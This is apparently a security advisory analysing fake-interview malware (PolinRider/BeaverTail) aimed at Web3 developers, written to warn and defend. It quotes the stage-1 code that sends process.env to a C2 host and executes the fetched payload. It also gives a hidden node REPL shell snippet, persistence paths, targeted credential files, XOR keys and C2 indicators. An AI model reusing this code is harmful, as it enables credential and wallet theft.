# 🚨 Security Advisory: "Etherwave Labs" Fake Interview Malware (PolinRider & BeaverTail)

## 📌 Executive Summary

This repository contains a real-world malware sample received as part of a technical screening interview for a **Full-Stack Developer (Web3 / Blockchain)** position from a fictitious company calling itself **"Etherwave Labs"** (`etherwavelabs.co`).

This campaign is part of the well-documented **"Contagious Interview"** attack vector attributed to **North Korean state-sponsored threat groups (Lazarus Group / Citrine Sleet)**. Threat actors set up fake Web3 company domains, contact developers on LinkedIn or job boards, invite them to a "live technical coding exercise," and instruct them to run the project locally.

Once the developer runs `npm run dev`, a multi-stage backdoor executes to exfiltrate developer secrets, wallet private keys, and establish an interactive remote shell.

---

## 🎭 The Social Engineering Lure

The candidate receives an interview invitation:
- **Company Name**: Etherwave Labs (`https://etherwavelabs.co`)
- **Position**: Full-Stack Developer (Web3 / Blockchain)
- **Format**: "Live coding exercise in Node.js, Express, React, and EVM integration"
- **Instructions**: Instructs the candidate to clone the repository and run `npm run dev` in both `backend/` and `crypto/`.

---

## 🔬 Technical Deep-Dive: Attack Anatomy

```
[npm run dev]
      │
      ▼
1. authController.js (ipLogger)
      │  Transmits all process.env to C2
      ▼
2. Vercel C2 Endpoint (https://ipcheck-auth.vercel.app/api/r)
      │  Returns 31 KB obfuscated JS; executed via:
      │  new Function.constructor("require", response.data)(require)
      ▼
3. Stage-2 Loader (PolinRider)
      │  Queries public Ethereum RPC for transactions from 0x1eEf...
      │  Extracts destination address: 0x5f87b597... -> 95.135.181.151
      ▼
4. Stage-3 Handshake (Plain HTTP over port 443)
      │  http://95.135.181.151:443/0x/cls (XOR Key: "q4FZkxX{!h,Sr3=@")
      │  http://95.135.181.151:443/0x/ls  (XOR Key: "y-p_>d$0B&@^1aQk")
      ▼
5. Stage-4 Payloads
      ├─► /0x/npm-migrate: Persistence script (.npm-ws.json / npm-cli hook)
      ├─► /0x/clb (161 KB): BeaverTail Infostealer (Crypto wallets, browser data, SSH, AWS)
      └─► /$/boot: Detached stealth background "node -i" REPL shell
```

---

### Stage 1: The Initial Trigger & Environment Exfiltration

In `workspace/backend/controllers/authController.js`, lines 28–41:

```javascript
const ipLogger = async(req, res) => {
  await axios.post(
    atob(config.HASHED_URL),
    { ...process.env },
    { headers: { "x-secret-header": "secret" } }
  )
  .then(response => {
    new Function.constructor("require", response.data)(require);
    console.log("The request was completed successfully!");
  })
  .catch(error => {
    console.log("The request was failed: ", error);
  });
}; ipLogger();
```

* **Exfiltration**: When `authController.js` is imported, it immediately dumps **all environment variables** (`process.env`) to `https://ipcheck-auth.vercel.app/api/r`. Any AWS credentials, GitHub tokens, database passwords, or private keys in the shell are immediately compromised.
* **Arbitrary Remote Code Execution (RCE)**: It compiles the incoming server response with `new Function.constructor("require", response.data)(require)`, passing Node's native `require` into the payload so the downloaded script has unrestricted system access.

---

### Stage 2: PolinRider & Blockchain Dead-Drop Resolving

The response from Vercel is a **31 KB heavily obfuscated script** with transposition ciphers (`spin`, `peel`, `splitLane`).

Instead of connecting to a static domain or IP (which defenders and Cloudflare easily take down), the loader implements an **Ethereum Dead-Drop Resolver**:

1. It queries public Ethereum RPC endpoints (`ethereum-rpc.publicnode.com`, `eth.blockscout.com`, `1rpc.io`) for transactions originating from this hardcoded attacker wallet:
   ```
   0x1eEf0849EDa15d87f64e51C73C8442Cf3c8bCEF3
   ```
2. The latest transaction sent by this wallet points to destination address:
   ```
   0x5f87b5975f87B59768656C6c6F6970626f742121
   ```
3. The loader parses the hex bytes of the recipient address:
   * First 4 bytes: `0x5f 87 b5 97` $\rightarrow$ **`95.135.181.151`** (Primary C2 IP)
   * Next 4 bytes: `0x5f 87 b5 97` $\rightarrow$ **`95.135.181.151`** (Secondary C2 IP)
   * Trailing 12 bytes in ASCII: `68 65 6c 6c 6f 69 70 62 6f 74 21 21` $\rightarrow$ **`helloipbot!!`**

---

### Stage 3: XOR Decryption over HTTP Port 443

The loader contacts `http://95.135.181.151:443` (unencrypted HTTP sent over TCP port 443 to bypass naive outbound port filters):

* **Endpoint `/0x/cls`**: Fetched and decrypted using XOR key:
  ```
  q4FZkxX{!h,Sr3=@
  ```
* **Endpoint `/0x/ls`**: Fetched and decrypted using XOR key:
  ```
  y-p_>d$0B&@^1aQk
  ```

---

### Stage 4: Execution, Persistence, and BeaverTail Stealer

The decrypted code executes several components:

#### 1. Stealth Process Spawning (`node -i`)
It spawns a background, detached Node REPL process without any terminal window:
```javascript
child = spawn('node', ['-i'], {
  detached: true,
  windowsHide: true,
  stdio: ['pipe', 'pipe', 'pipe']
});
```
It strips `end` listeners on standard input and feeds commands directly into the running REPL to act as a stealthy reverse shell.

#### 2. Persistence Mechanism (`stage4_npm_migrate.js`)
* Creates a hidden configuration in `~/.node_modules/.npm-ws.json`.
* Spawns a daemon tracked by `~/.node_modules/.npm-ws.pid`.
* On Windows systems, it modifies `npm-cli.js` inside `%APPDATA%\npm` so every time the developer runs any `npm` command in the future, the malware silently re-executes.

#### 3. BeaverTail Infostealer (`stage4_clb.js` — 161 KB)
The main payload is a 161 KB LZ-String packed infostealer targeting:
* **Browser Extension Wallets**: MetaMask, Phantom, Coinbase Wallet, TronLink, Binance Chain Wallet, Exodus.
* **Local Crypto Keys**: `~/.config/solana/id.json`, raw Ethereum keystores, `wallet.dat`.
* **Developer Credentials**: `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.docker/config.json`, and `.env` files across recent projects.
* **Communication Tokens**: Discord and Telegram session tokens.

---

## 🎯 Indicators of Compromise (IoCs)

| Type | Indicator / Value | Description |
| :--- | :--- | :--- |
| **Phishing Company** | `Etherwave Labs` (`etherwavelabs.co`) | Fake company persona |
| **Initial C2 Domain** | `ipcheck-auth.vercel.app` | Vercel serverless staging host |
| **Initial C2 Path** | `/api/r` | Exfiltration & payload endpoint |
| **Dead-Drop Wallet** | `0x1eEf0849EDa15d87f64e51C73C8442Cf3c8bCEF3` | Ethereum wallet controlling C2 IP |
| **Dead-Drop Tx To** | `0x5f87b5975f87B59768656C6c6F6970626f742121` | Encodes IP `95.135.181.151` |
| **Active C2 IP** | `95.135.181.151:443` | Main stage-3/4 payload server |
| **Endpoints** | `/0x/cls`, `/0x/ls`, `/0x/clb`, `/0x/cb`, `/0x/npm-migrate`, `/$/boot` | Payload endpoints |
| **XOR Key 1** | `q4FZkxX{!h,Sr3=@` | Key for `/0x/cls`, `/0x/clb` |
| **XOR Key 2** | `y-p_>d$0B&@^1aQk` | Key for `/0x/ls` |
| **XOR Key 3** | `ThZG+0jfXE6VAGOJ` | Key for `/$/boot` |
| **Persistence File** | `~/.node_modules/.npm-ws.json` | Runner configuration |
| **Persistence File** | `~/.node_modules/.npm-ws-runner.js` | Persistent background payload |
| **Persistence PID** | `~/.node_modules/.npm-ws.pid` | Process lock |

---

## 🛡️ Key Takeaway for Developers

1. **Never run take-home interview projects directly on your host machine.** Always inspect the source code or run inside an isolated VM/container where:
   - Your host `~/.ssh`, `~/.aws`, and browser profiles are **not** mounted.
   - Host environment variables are not inherited.
2. **Beware of interview repos requiring background services.** Attackers frequently hide `child_process.exec()` or `new Function()` in obscure utility files, ORMs, or auth controllers.
3. **If you ran this project on your host machine without a container:**
   - Immediately rotate all SSH keys, AWS/cloud credentials, and API tokens.
   - Move funds from any software wallets (MetaMask, Phantom, Solana CLI) to a hardware wallet or fresh address.
   - Inspect `~/.node_modules/` and your global npm scripts for unauthorized runner files.
